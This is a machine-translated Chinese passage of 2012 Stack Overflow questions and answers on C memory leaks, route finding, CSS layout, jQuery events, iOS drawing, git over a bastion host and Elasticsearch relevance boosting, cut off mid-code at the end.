1.  您将在典型的日志记录/跟踪实现中看到 Flush 的概念。这就是“刷新”尚未刷新的日志条目的内容。这允许批处理多个日志条目。同样，现有的日志记录实现已经实现了这个概念，因此您只需覆盖现有的类。例如 NLog 有一个[BufferingWrapper](http://nlog-project.org/wiki/BufferingWrapper_target)目标用于这个确切的目的。

2.  这可以通过如上所述更新您的对象模型来解决。

总的来说，我会尝试使用 RavenDB 目标/附加器来扩展现有的日志框架，而不是尝试自己动手。日志记录是一个很好的框架，你可以通过使用它们来学习很多关于日志记录实践的知识。

# c - 指针被释放但 valgrind 说它不是

> ID：12427408
> 
> 赞同：1
> 
> 时间：2012-09-14T15:19:01.380
> 
> 标签：c, memory, malloc, valgrind, loss

我释放了我创建的指针，但 Valgrind 仍然报告我丢失了字节，所以我不确定如何处理它。

有问题的代码是：

```
listNode* temp = (listNode*)malloc(sizeof(listNode));
node = list->head;
while (node != NULL)
{
    temp = node->next;
    free(node->entry);
    free(node);
    node = temp;
}
free(temp); 
```

使用 valgrind 输出：

```
16 bytes in 1 blocks are definitely lost in loss record 13 of 21
==2137==    at 0xB823: malloc (vg_replace_malloc.c:266)
==2137==    by 0x100001B1E: freeList (main.c:110)
==2137==    by 0x100001CB5: main (main.c:157) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T15:21:41.967

您不会`free`在给定的代码中分配内存`malloc`，除非`node == NULL`. 您分配一块内存，将其分配给`temp`，然后继续循环以重新分配给`temp`其他地址，从而丢失您分配给 的内存`malloc`。

看起来您根本不需要`malloc`：您只是`temp`用作临时指针：为什么需要为它分配内存？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:34:14.437

看起来您想要遍历节点列表以释放各种链接。listNode 结构似乎包含两个成员，entry 具有指向节点信息的指针，next 指向列表中的下一个节点。最后你有 listNode 本身，它也需要被释放。

假设列表的末尾由 next 表示为 NULL，我将采取的方法如下：

```
listNode *nodeCur, *nodeNext ;

nodeCur= list->head;
while (nodeCur)
{
    nodeNext = nodeCur->next;
    free(nodeCur->entry);
    free(nodeCur);
    nodeCur = nodeNext;
} 
```

下一个问题是什么是变量列表。作为删除列表的一部分，它是否也需要被释放？

# algorithm - 沿着兴趣点寻找路线

> ID：12427410
> 
> 赞同：3
> 
> 时间：2012-09-14T15:19:04.367
> 
> 标签：algorithm, graph, map, routes, path-finding

我有一张地图，上面有目的地（下面的红点）和一些兴趣点（黄色、绿色和蓝色的点）。

![地图1](../Images/680e8331fd62258c652b4eccdb5d5d96.png)

我试图找到通往目的地的路径，但起点未定义 - 我只是希望它通过尽可能多的兴趣点，而不是迂回路线。

例如，在这种情况下，以下（粉红色线）将是一条很好的路线：

![地图2](../Images/acfdb5021e411390d31ff61ba5a05979.png)

黄色的点是离目的地最远的 POI（在这种情况下没有用），绿色的点是接下来最远的四个。

任何人都可以提出一个适合这个的算法吗？

这是变成图表的合适问题吗？“不太迂回”的要求似乎暗示了这一点，但我将如何与想要通过尽可能多的 POI 相协调呢？

编辑：澄清“不太迂回”的要求。我只是希望它是一条合理的路线，例如所有拐角的总和最多转动 90 度。POI 将始终在目的地附近，因此长度并不是真正的问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:32:27.353

问题可以明确地简化为所有 POI`G=(V,E)`所在的图，在这种情况下是（所有顶点之间的边）。您还需要生成一个权重函数，使得`V``E``V x V``w:E->R``w(u,v) = distance between u and v`

这个问题实际上是[旅行商问题](http://en.wikipedia.org/wiki/Travelling_salesman_problem)的一个变体，所以它是[NP-Hard](http://en.wikipedia.org/wiki/NP-hard)（所以没有已知的多项式解决方案） - 但看看周围，[这个问题有很多启发式方法](http://en.wikipedia.org/wiki/Travelling_salesman_problem#Heuristic_and_approximation_algorithms)。

此外 - 如果您不期望有很多 POI（比如 20-30） - 可以使用动态规划解决方案来找到所有点之间的最佳路径。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:29:59.903

看起来你可以把它变成一个图，为每个兴趣点分配一个负权重（可能通过减少通向该点的任何边的值），然后将所述图插入 Bellman-Ford 算法] [1](http://en.wikipedia.org/wiki/Bellman%E2%80%93Ford_algorithm "贝尔曼福特算法")，这允许负长度边缘。如果两个 POI 非常靠近，则可能会出现唯一的问题，因此可能需要某种修剪方法。

# css - 如何在 CSS 中将相对顶部与绝对底部结合起来？

> ID：12427414
> 
> 赞同：3
> 
> 时间：2012-09-14T15:19:11.007
> 
> 标签：css

我需要定义一个`div`必须保持在正常位置的顶部，这与周围元素的顶部不同：

```
position:relative
top:0 
```

并且高度增长到周围元素的大小：

```
position:absolute
bottom:0 
```

我不知道如何将两者结合起来。每当我使用相对框时，我会松开绝对底部，而每当我使用绝对框时，我会松开相对顶部。

任何人都可以帮助我如何在 CSS 中做到这一点吗？

这是一个例子：

```
<html>
  <head>
  </head>
  <style type="text/css">
  @media screen {
      body {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          margin: 0;
          padding: 0;
      }
      #head {
          background-color: gray;
      }
      #rel {
          background-color: green;
          position: relative;
          top: 0;
          bottom: 0;
          float: left;
      }
      #abs {
          background-color: red;
          position: absolute;
          top: 0;
          bottom: 0;
          float: left;
      }
  }
  </style>
  <body>
    <div id="head">
      <h1>Head</h1>
    </div>
    <div id="abs">
      <h2>absolute</h2>
    </div>
    <div id="rel">
      <h2>relative</h2>
    </div>
  </body>
</html> 
```

“相对”根本不增长，“绝对”增长太多。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:21:32.830

```
div {
    top:0;
    height:100%; /* height calculated based off the height of parent element */
    margin:0;
} 
```

[高度属性 CSS](https://developer.mozilla.org/en-US/docs/CSS/height)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-26T21:34:05.070

在外部 div 上使用 display:table 并在内部 div 上显示 table-row：见这个小提琴：http: [//jsfiddle.net/JKQ2y/15/](http://jsfiddle.net/JKQ2y/15/) Html：

```
<div class="outer">
  <div class="rel">
    <div class="m b">text</div>
  </div>
  <div class="inner">
    <div class="m r"></div>
  </div>
</div> 
```

CSS：

```
.outer{
  border:1px solid black;
  height:100px; width: 100px
  display:table;
}
.rel {
  height:30px;
  display:table-row;
}
.inner {
  border: 1px solid red;
  position:relative;
  display:table-cell;
}
.m {height:100%;}
.m.b {border:1px solid blue;}
.m.r {border:1px solid red;} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-02T05:38:58.050

HTML：

```
<div class="body">
  <div class="head">
    <div class="head-content">text</div>
  </div>
  <div class="growing-area">
  </div>
</div> 
```

CSS：

```
.body{
  height:100px; width: 100px;
  display:table;
}
.head {
  height:0px;
  display:table-row;
}
.growing-area {
  position:relative;
  display:table-cell;
} 
```

定义头部的小高度很重要，但实际大小由内容控制，或者您可以定义头部内容高度：

```
.head-content {
  height:30px;
 } 
```

小提琴：http: [//jsfiddle.net/JKQ2y/36/](http://jsfiddle.net/JKQ2y/36/)

# asp.net - 我如何在登录视图中使用按钮

> ID：12427416
> 
> 赞同：0
> 
> 时间：2012-09-14T15:19:11.927
> 
> 标签：asp.net, vb.net

我在 loginview 中添加了一个按钮，但是这段代码不起作用，我是否需要一些 findcontrol，例如当我在 loginview 中有文本框时等等！？？

这不起作用我的登录视图有 id="loginview2"

```
Protected Sub btnSave_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnSave.Click 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:21:25.087

html 中的 < asp:Button 是否将“btnSave_Click”附加到“Click”？

# python - Twisted 下的 py 更新不反映

> ID：12427417
> 
> 赞同：0
> 
> 时间：2012-09-14T15:19:14.237
> 
> 标签：python, twisted

我正在更改一个运行 Twisted 环境的一部分的 .py 文件。但是，脚本运行时不会反映更新。

我做了这些步骤无济于事：触及wsgi文件，b。重新启动apache，c。删除了相应的 .pyc 文件。

任何人能发出的光都将是超级的！谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-15T00:30:26.910

没有人能真正说出来。这个问题没有足够的细节。

一个可能的问题是“使用 Twisted”的 Django 应用程序是通过在子进程或单独的进程中运行 Twisted 来实现的。也许你的 Apache 东西正在重新运行你的整个 Django 脚本，但是有一个 Twisted 进程关闭在继续运行的一边？

或者，也许您的部署基础设施的某些部分正在调用`reload()`您的 Django 模块，但 Twisted 在其他线程中，因此不受此影响？

（请考虑在此附上[SSCCE](http://sscce.org)，以便让受访者有所了解。）

# jquery - jQuery - 通过 appendTo() 添加的复选框似乎无法正确处理点击事件

> ID：12427419
> 
> 赞同：0
> 
> 时间：2012-09-14T15:19:17.450
> 
> 标签：jquery, checkbox, click, appendto

我有一个按钮，单击它会添加复选框和文本字段。此外，我正在计算复选框 - 这似乎不起作用。所以我又添加了 2 个“静态”的，它起作用了。奇怪的是，通过 appendTo() 添加的那个只有在我点击“静态”框后才被计算在内。我的意思是，例如单击 appendTo() 复选框 - 计数为 0 单击“静态”一个 - 它显示两个，这是正确的。

```
$(function() {
   // other stuffs
   function countChecked() {
          var n = $(":checked").length;
          $("#a").text(n + (n === 1 ? " is" : " are") + " checked!");
   }
   countChecked();
   $(":checkbox").click(countChecked);

    $( "#addanswer" ).click(function() { 
                clicked=clicked+1;
                $('<input>').attr({
                    type: 'checkbox',
                    id: 'markup['+clicked+']',
                    name: 'markup['+clicked+']'
                }).appendTo('#myForm').after("");               
                $('<input>').attr({
                    type: 'text',
                    id: 'answer['+clicked+']',
                    name: 'answer['+clicked+']'
                }).appendTo('#myForm').after("<br />");
            });    
          // ...
          // ... 
```

任何人都可以告诉我有什么问题吗？我已经尝试过各种计数方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:25:34.943

改为使用`.on`。

```
$('#myForm').on('click', 'input:checkbox', countChecked); 
```

# iphone - NSString 到 UIImage 绘图问题

> ID：12427422
> 
> 赞同：2
> 
> 时间：2012-09-14T15:19:23.470
> 
> 标签：iphone, ios, nsstring, uiimage, drawing

我正在使用此代码从文本生成 UIImage

[如何使用 NSString 绘制功能从文本创建 UIImage](https://stackoverflow.com/questions/2765537/how-do-i-use-the-nsstring-draw-functionality-to-create-a-uiimage-from-text)

但是图像质量非常低。我应该更改哪些参数来提高图像质量？有没有办法设置分辨率等？

如果有人知道这方面的好指南或文档，请提供链接。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:37:40.140

尝试增加该代码中的字体大小。这将为开始提供更大的图像，并可能改善您的体验。

# facebook - FB App Open Graph - 应用程序不会发布到墙上

> ID：12427424
> 
> 赞同：0
> 
> 时间：2012-09-14T15:19:24.390
> 
> 标签：facebook, facebook-graph-api, facebook-javascript-sdk, facebook-canvas

我正在尝试使 Open Graph 工作。在应用程序的管理中，我有以下两项：

```
Action Types: write - note
Object Types: note 
```

我不知道为什么，但 Open Graph 仍然无法正常工作。我按照[本](http://developers.facebook.com/docs/opengraph/tutorial/)教程进行操作，但是当我按下按钮时，仍然出现**错误**。

相关代码：

```
 <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# my_url: http://ogp.me/ns/fb/my_url#">
  <meta property="fb:app_id" content="ID" /> 
  <meta property="og:type"   content="note" /> 
  <meta property="og:url"    content="http://google.com" /> 
  <meta property="og:title"  content="Sample text" /> 
  <meta property="og:image"  content="https://s-static.ak.fbcdn.net/images/devsite/attachment_blank.png" /> 

<script type="text/javascript">
  function postCook()
  {
      FB.api(
        '/me/my_url:write',
        'post',
        { note: 'http://google.com' },
        function(response) {
           if (!response || response.error) {
              alert('Error occured');
           } else {
              alert('Cook was successful! Action ID: ' + response.id);
           }
        });
  }
</script> 
```

```
 <script>
        window.fbAsyncInit = function() {
          FB.init({
            appId      : 'ID', // App ID
            status     : true, // check login status
            cookie     : true, // enable cookies to allow the server to access the session
            xfbml      : true  // parse XFBML
          });
        };

        // Load the SDK Asynchronously
        (function(d){
          var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
          js = d.createElement('script'); js.id = id; js.async = true;
          js.src = "//connect.facebook.net/en_US/all.js";
          d.getElementsByTagName('head')[0].appendChild(js);
        }(document));
    </script>

    <form>
      <input type="button" value="Write" onclick="postCook()" />
    </form> 
```

我整天都在玩 Open Graph 的设置，但仍然找不到正确的配置。

想念我重要的东西？或者我怎样才能深入调试这个基本应用程序？

**编辑**错误消息说：

```
code: 2500
message: "Unknown path components: /my_url:write"
type: "OAuthException" 
```

此外，当我打开链接（来自 Facebook 开发人员管理）时，应该在哪里显示所有操作，只有：

```
{
   "data": [

   ]
} 
```

# php - 在 .ajax() 附加的 html 上应用函数

> ID：12427428
> 
> 赞同：-1
> 
> 时间：2012-09-14T15:19:39.013
> 
> 标签：php, jquery, ajax

我正在尝试垂直对齐从 ajax 返回的图片，但是当我对从 ajax 返回的图片（HTML）执行此操作时，它不适用。这是我的代码：

```
$.ajax({
    type: "POST",
    url: "extra.php",
    data: mystr,
    cache: false,
    success: function(html) {
        $('.mydiv').empty();
        $(".mydiv").append(html);
        middle_align();     
    }
}); 
```

这是我要附加的

```
echo '
<div id="box">
<img src="'.$path.$name.'.jpg"  class="loadimg" />
                </div>  '; 
```

这是中间对齐功能

```
function middle_align(){
     var child = $(".loadimg").height();
     var parent = $("#box").height();
 var margin = (parent - child)/2;
  $(".box").children("img").css('margin-top', margin); 
                    } 
```

该函数在其他任何地方都可以正常工作，但不适用于 ajax 加载的数据。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:36:53.480

尝试使ajax同步， `async : false`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:40:26.663

尝试这个

```
success: function(html) {
$('.mydiv').html('');
$(".mydiv").append(html);
var child = $(".loadimg").height();
var parent = $("#box").height();
margin =(parent - child) / 2 ;
$("#box").find("img").css('margin-top', margin);
} 
```

# php - 传递具有特殊字符的字符串

> ID：12427431
> 
> 赞同：0
> 
> 时间：2012-09-14T15:19:44.920
> 
> 标签：php, javascript, jquery, html, web

我正在尝试传递带有空格和特殊字符的字符串，但它出现错误并且没有任何工作。例如

```
 <img onclick='addKeyword("celebritynews&gossip");' src="images/plus.png" > 
```

但是字符串名人新闻和八卦中的“&”正在破坏代码。

我发现问题出在`addKeyword`函数上，我使用以下代码定义了一个名为 url 的变量，

```
function addKeyword(categoryId){
var url = "addKeyword.php?uid=" + user_id + "&categoryId=" + categoryId + "&keyword=" + $("#keyword_" + categoryId).attr("value");
} 
```

并且 $("#keyword_" + categoryId) 引起了问题。有什么办法解决吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:21:35.610

假设您在 URL 上传递字符串，则参数值需要进行 URL 编码。

...摘要编辑...

被`&`解释为 HTML 并且必须是 HTML 编码的，特别是`&amp;`

HTML

```
<img onclick='addKeyword("celebritynews&amp;gossip");' src="images/plus.png" /> 
```

JavaScript

使用 encodeURIComponent(s)。

```
var url = "addKeyword.php?uid=" + encodeURIComponent(user_id) + "&categoryId=" + encodeURIComponent(categoryId) + "&keyword=" + encodeURIComponent($("#keyword_" + categoryId).attr("value")); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:54:41.957

尝试

```
<img onclick="addKeyword('<?php echo htmlspecialchars('celebritynews&gossip'); ?>')" src="images/plus.png" > 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:24:20.403

假设您正在将此文本写入页面，您可以使用[`htmlspecialchars`](http://php.net/manual/en/function.htmlspecialchars.php)它来确保它在 HTML 中正确转义。

例如：

```
<?php echo htmlspecialchars("celebritynews&gossip"); ?> 
```

这有帮助吗？

# jquery - 带有 HTML 的 jQuery 表单验证代码

> ID：12427433
> 
> 赞同：0
> 
> 时间：2012-09-14T15:19:51.257
> 
> 标签：jquery, forms

嗨，我是一名学生程序员，我正在编写和使用我研究过的代码来为我的注册表单构建一层客户端验证，因为这是我第一次这样做，我不太明白去工作。如果有比我更有经验的人想快速查看 HTML 和 Javascript，他们希望能够告诉我为什么当我写入表单字段并提交我编写的验证代码时没有做任何事情.

感谢您在我继续学习时帮助我。

```
 <div class="content">
            <div id="form_wrapper" class="form_wrapper">
                <form class="register active" action="regprocess.php" method = "post">
                    <h3 class="font">REGISTER</h3>
                    <div class="column">
                        <div>
                            <label for="t1">Firstname:</label>
                            <input type="text" id="t1" name="firstname" class="required" />
                            <span class="errorMessage"id="errormessage_firstname">This is an error</span>
                        </div>
                        <div>
                            <label for="t2">Username:</label>
                            <input type="text" id="t2" name="username" class="required" />
                            <span class="errorMessage"id="errormessage_username">This is an error</span>
                        </div>
                        <div>
                            <label for="t3">Email:</label>
                            <input type="text" id="t3" name="email" class="required"/>
                            <span class="errorMessage"id="errormessage_email">This is an error, please give a valid email address.</span>
                        </div>
                    </div>
                    <div class="column">
                        <div>
                            <label for="t4">Lastname:</label>
                            <input type="text" id="t4" name="lastname" class="required"/>
                            <span class="errorMessage"id="errormessage_lastname">This is an error</span>
                        </div>
                        <div>
                            <label for="p1">Password:</label>
                            <input type="password" id="p1"name ="pass" class="required" />
                            <span class="errorMessage"id="errormessage_pass">This is an error</span>
                        </div>
                        <div>
                            <label for="p1">Re-enter Password:</label>
                            <input type="password" id="p2" name="pass" class ="required"/>
                            <span class="errorMessage" id="errormessage_pass">This is an error</span>
                        </div>
                    </div>
                    <div class="bottom">
                        <div class="remember">

                        </div>
                        <input type="submit" value="Register" />
                        <a href="index.html" rel="login" class="linkform">You have an account already? Log in here</a>
                        <div class="clear"></div>
                    </div>
                </form>
                <script type="text/javascript">

                    $('form').submit(function(event){

                        var isErrorFree = true;
                        //iterate through required form elements, check if valid
                        $('input.required',this).each(function(){
                            if(validateElement.isValid(this) == false){
                                isErrorFree = false;
                            };
                        });
                    return isErrorFree;
                    });

                    var validateElement = {

                        isValid:function(element){
                            var isValid = true;
                            var $element = $(element);
                            var id = $element.attr('id');
                            var name = $element.attr('name')
                            var value = $element.val();

                            var type = $element[0].type.toLowerCase();

                            switch(type){
                                case 'text':
                                case 'password':
                                if (value.length == 0 ||
                                    value.replace(/\s/g,'').length == 0){ isValid = false;}
                                    break;
                                    function emailReg2(){
                                    var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
                                    if(!emailReg.test(email)){
                                        isValid = false;
                                        var method =  isValid ? 'removeClass' : 'addClass';
                                    };
                                    var method =  isValid ? 'removeClass' : 'addClass';

                                    $('#errorMessage_' + name)[method]('showErrorMessage');
                                    $('label[for="' + id + '"]')[method]('error');

                                    return isValid;

                            }

                    }
                    }
                    };

                </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:56:16.943

添加了“return false”以在出现错误时中断每个循环。

```
$('form').submit(function(event){
    var isErrorFree = true;
    //iterate through required form elements, check if valid
    $('input.required',this).each(function(){
        if(validateElement.isValid(this) == false){
          isErrorFree = false;
          return false;
        };
    });
    return isErrorFree;
}); 
```

您的每个循环都会遍历整个所需的输入元素集，并在每次迭代时更新 isErrorFree 变量。一旦出现验证错误，您会希望立即退出循环。否则，isErrorFree 将始终返回集合中最后一个元素的验证结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:27:05.993

类型文本的切换大小写..这里什么都不做......无论如何你为什么不使用jquery验证插件..

[http://bassistance.de/jquery-plugins/jquery-plugin-validation/](http://bassistance.de/jquery-plugins/jquery-plugin-validation/)

便于使用.....

# ios - UIImage 的 drawInrect：平滑图像

> ID：12427435
> 
> 赞同：16
> 
> 时间：2012-09-14T15:19:54.397
> 
> 标签：ios, uikit, uiimage, antialiasing

我正在尝试使用`UIImage`'s`drawInRect:`方法绘制图像。这是代码：

```
UIImage *image = [UIImage imageNamed:@"OrangeBadge.png"];

UIGraphicsBeginImageContext(image.size);

[image drawInRect:CGRectMake(0, 0, image.size.width, image.size.height)];

UIImage *resultImage = UIGraphicsGetImageFromCurrentImageContext();

UIGraphicsEndImageContext(); 
```

问题是生成的图像是模糊的。这是与源图像（左侧）相比的结果图像（右侧）：

![源图像和模糊图像](../Images/236e320a6ca388bcb414b432752de415.png)

我都试过了`CGContextSetAllowsAntialiasing(UIGraphicsGetCurrentContext(), NO)` `CGContextSetShouldAntialias(UIGraphicsGetCurrentContext(), NO)`，但这并没有解决问题。

有任何想法吗？

提前致谢。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-09-14T15:28:41.123

如果您在 Retina 设备上进行开发，则问题可能与您的图形上下文的分辨率有关。你会尝试：

```
UIGraphicsBeginImageContextWithOptions(size, NO, 2.0f); 
```

这将启用视网膜分辨率。此外，您的图像应该在@2x 分辨率下可用，这样才能正常工作。

如果你也想支持非视网膜设备，你可以使用：

```
if ([UIScreen instancesRespondToSelector:@selector(scale)]) {
    UIGraphicsBeginImageContextWithOptions(newSize, NO, 0.0f);
} else {
    UIGraphicsBeginImageContext(newSize);
} 
```

# git - 如何让 git 使用“ssh”以外的 ssh (rsh) 传输

> ID：12427440
> 
> 赞同：2
> 
> 时间：2012-09-14T15:20:10.880
> 
> 标签：git, ssh, rsync, rsh

是否有可能让 git 使用“ssh”以外的东西作为 ssh 程序？为此，rsync 有一个 -e 选项，以及可以将 rsh 或 ssh 用作传输的其他接口。我的特定用例是通过堡垒主机链接 ssh 连接，因为防火墙不允许直接 ssh 访问我从中克隆/拉取的主机。

到目前为止，我想出的最佳解决方案是创建一个目录，其中包含一个名为“ssh”的可执行文件，并将该目录放在我的 PATH 的开头。“ssh”文件的内容是：

```
#!/bin/sh
# If we were being clever we'd look at where we were and just snip that
# off the path.
export PATH=/bin:/usr/bin:/sbin:/usr/sbin
exec ssh bastion.example.org ssh "$@" 
```

这可行，但该方法有许多缺点。

请注意， GIT_SSH 环境变量不符合我的要求，因为您仍然必须创建一个脚本并引用它。而使用 rysnc 的 -e 选项我可以做到

```
rsync -e 'ssh -K bastion.example.org ssh' ... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-02T19:11:24.240

您可以配置 ssh 本身，而不是尝试将 git 配置为使用另一个程序：

在`~/.ssh/config`文件上，添加一个新`Host`部分

```
Host git.example.org
  Username myusername
  ProxyCommand ssh bastion.example.org "nc git.example.org 22" 
```

然后，您只需将遥控器指向“git.example.org”主机。

另外，如果你使用 OpenSSH >= 5.4 并且不想依赖服务器上的 netcat，你可以使用 SSH 的[netcat 模式](http://blog.rootshell.be/2010/03/08/openssh-new-feature-netcat-mode/)来代替：

```
Host git.example.org
  Username myusername
  ProxyCommand ssh bastion.example.org -W "git.example.org:22" 
```

# android - 动态壁纸强制关闭

> ID：12427442
> 
> 赞同：0
> 
> 时间：2012-09-14T15:20:14.407
> 
> 标签：android, live-wallpaper

单击“设置”按钮时，我的 Live wall 应用程序强制关闭。

wall_setting.xml

```
 <?xml version="1.0" encoding="utf-8"?>
    <PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android">

<ListPreference 
        android:key="time_interval"
        android:title="@string/app_name"
        android:summary="something"
        android:defaultValue="3000" 
        android:entries="@array/updateInterval"
        android:entryValues="@array/updateIntervalValues"
    />

</PreferenceScreen> 
```

主要的.xml

```
<?xml version="1.0" encoding="utf-8"?>
<wallpaper xmlns:android="http://schemas.android.com/apk/res/android"
android:thumbnail="@drawable/ic_launcher"
android:settingsActivity="com.zacharia.lunar.WallService"
android:description="@string/wall_desc" /> 
```

清单.xml

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.zacharia.lunar"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="7"
    android:targetSdkVersion="15" />
<uses-feature 
    android:name="android.software.live_wallpaper"
    android:required="true"></uses-feature>

   <application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >

    <service 
       android:name="com.zacharia.lunar.WallService"
       android:enabled="true"
       android:permission="android.permission.BIND_WALLPAPER">
        <intent-filter>
<action android:name="android.service.wallpaper.WallpaperService"></action>
        </intent-filter>
        <meta-data 
            android:name="android.service.wallpaper"
            android:resource="@xml/main"></meta-data>
    </service>
    <activity
        android:name="com.zacharia.lunar.SettingActivity"
        android:label="@string/title_activity_main" 
        android:theme="@android:style/Theme.Light.WallpaperSettings"
        android:exported="true">

    </activity>
</application>

</manifest> 
```

错误

> InvocationTargetException 09-14 20:36:53.491: E/AndroidRuntime(542): 在 com.android.wallpaper.livepicker.LiveWallpaperPreview.configureLiveWallpaper(LiveWallpaperPreview.java:113) 09-14 20:36:53.491: E/AndroidRuntime(542 ): at java.lang.reflect.Method.invokeNative(Native Method) 09-14 20:36:53.491: E/AndroidRuntime(542): at java.lang.reflect.Method.invoke(Method.java:521) 09 -14 20:36:53.491: E/AndroidRuntime(542): 在 android.view.View$1.onClick(View.java:2026) 09-14 20:36:53.491: E/AndroidRuntime(542): ... 20 更多 09-14 20:36:53.491: E/AndroidRuntime(542): 由: android.content.ActivityNotFoundException: 无法找到显式活动类 {com.zacharia.lunar/com.zacharia.lunar.WallService}; 您是否在 AndroidManifest.xml 中声明了此活动？09-14 20:36:53.491：E/AndroidRuntime(542)：在 android.app。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:26:26.307

在`main.xml`

```
 android:settingsActivity="com.zacharia.lunar.WallService" 
```

应该读;

```
 android:settingsActivity="com.zacharia.lunar.SettingActivity" 
```

# search - ElasticSearch——基于字段值提升相关性

> ID：12427449
> 
> 赞同：66
> 
> 时间：2012-09-14T15:20:42.870
> 
> 标签：search, elasticsearch

需要在 ElasticSearch 中找到一种方法来根据字段的特定值提高文档的相关性。具体来说，在我的所有文档中都有一个特殊字段，字段值越高，包含它的文档应该越相关，无论搜索如何。

考虑以下文档结构：

```
{
    "_all" : {"enabled" : "true"},
    "properties" : {
        "_id":            {"type" : "string",  "store" : "yes", "index" : "not_analyzed"},
        "first_name":     {"type" : "string",  "store" : "yes", "index" : "yes"},
        "last_name":      {"type" : "string",  "store" : "yes", "index" : "yes"},
        "boosting_field": {"type" : "integer", "store" : "yes", "index" : "yes"}
        }
} 
```

我希望具有较高 boosting_field 值的文档本质上比具有较低 boosting_field 值的文档**更相关。**这只是一个起点——在确定搜索中每个文档的最终相关性分数时，还将考虑查询与其他字段之间的匹配。但是，**在其他条件相同的情况下，提升字段越高，文档越相关**。

任何人都知道如何做到这一点？

非常感谢！

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2012-09-14T19:17:07.500

您可以在索引时间或查询时间提升。我通常更喜欢查询时间提升，即使它会使查询变慢一点，否则每次我想更改我的提升因子时我都需要重新索引，这通常需要微调并且需要非常灵活。

使用 elasticsearch 查询 DSL 应用查询时间提升的方法有多种：

*   [提升查询](http://www.elasticsearch.org/guide/reference/query-dsl/boosting-query.html)
*   [自定义过滤器分数查询](http://www.elasticsearch.org/guide/reference/query-dsl/custom-filters-score-query.html)
*   [自定义提升因子查询](http://www.elasticsearch.org/guide/reference/query-dsl/custom-boost-factor-query.html)
*   [自定义分数查询](http://www.elasticsearch.org/guide/reference/query-dsl/custom-score-query.html)

如果您想对匹配特定查询或过滤器的文档进行特定提升，前三个查询很有用。例如，如果您只想提升上个月发布的文档。您可以将这种方法与您的 boosting_field 一起使用，但您需要手动定义一些 boosting_field 间隔并给它们一个不同的提升，这不是很好。

最好的解决方案是使用[自定义分数查询](http://www.elasticsearch.org/guide/reference/query-dsl/custom-score-query.html)，它允许您使用脚本进行查询并自定义其分数。相当强大，使用脚本可以直接修改乐谱本身。首先，例如，我会将 boosting_field 值缩放为从 0 到 1 的值，这样您的最终分数就不会变成一个大数字。为此，您需要预测该字段可以包含的或多或少的最小值和最大值。例如，假设最小 0 和最大 100000。如果将 boosting_field 值缩放为 0 到 1 之间的数字，则可以将结果添加到实际分数中，如下所示：

```
{
    "query" : {
        "custom_score" : {
            "query" : {
                "match_all" : {}
            },
            "script" : "_score + (1 * doc.boosting_field.doubleValue / 100000)"
        }
    }
} 
```

您还可以考虑将 boosting_field 用作提升因子（`_score *`而不是`_score +`），但是您需要将其缩放到最小值为 1 的区间（只需添加 +1）。

您甚至可以调整结果以改变其重要性，为您用来影响分数的值添加权重。如果您需要将多个增强因子组合在一起以赋予它们不同的权重，您将更需要这个。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2014-12-14T19:36:31.407

使用最新版本的 Elasticsearch（1.3+ 版），您需要使用“功能得分查询”：

[http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html)

评分的 query_string 搜索如下所示：

```
{
 'query': {
        'function_score': {
            'query': { 'query_string': { 'query': 'my search terms' } },
            'functions': [{ 'field_value_factor': { 'field': 'my_boost' } }]
        }
    }
} 
```

“my_boost”是搜索索引中的一个数字字段，其中包含单个文档的提升因子。可能看起来像这样：

```
{ "my_boost": { "type": "float", "index": "not_analyzed" } } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-01-26T17:23:37.670

如果您想避免每次在查询中进行提升，您可以考虑将其添加到您的映射中，直接添加“提升：因子。

因此，您的映射可能如下所示：

```
{
    "_all" : {"enabled" : "true"},
    "properties" : {
        "_id":            {"type" : "string",  "store" : "yes", "index" : "not_analyzed"},
        "first_name":     {"type" : "string",  "store" : "yes", "index" : "yes"},
        "last_name":      {"type" : "string",  "store" : "yes", "index" : "yes"},
        "boosting_field": {"type" : "integer", "store" : "yes", "index" : "yes", "boost" : 10.0,}
        }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-09-19T13:39:27.050

如果您使用的是 Nest，则应使用以下语法：

```
.Query(q => q
    .Bool(b => b
        .Should(s => s
